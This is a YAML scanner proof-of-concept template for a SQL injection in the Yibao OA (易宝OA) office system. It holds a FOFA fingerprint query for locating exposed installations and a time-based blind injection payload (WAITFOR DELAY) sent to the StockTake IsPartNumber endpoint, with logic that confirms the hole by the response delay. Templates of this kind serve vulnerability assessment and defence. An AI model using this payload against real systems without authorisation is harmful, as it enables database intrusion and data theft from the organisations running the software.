id: poc-yaml-yi-bao-oa-system-stocktake-ispartnumber-sqli
info:
  name: 易宝OA系统 IsPartNumber SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易宝OA
  fofa: body="欢迎登录易宝OA系统"
variables:
  t1: random_int(3,7)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"欢迎登录易宝OA系统")
- method: GET
  path: /SmartTradeScan/StockTake/IsPartNumber?pn=1'WAITFOR+DELAY+'0:0:{{.t1}}'--
  expression: status_code == 200 && contains(body,"\"is_succeed\":true") && contains(body,"\"data\":")
    && !contains(body,"<") && duration >= t1 && duration <= t2
transport: http
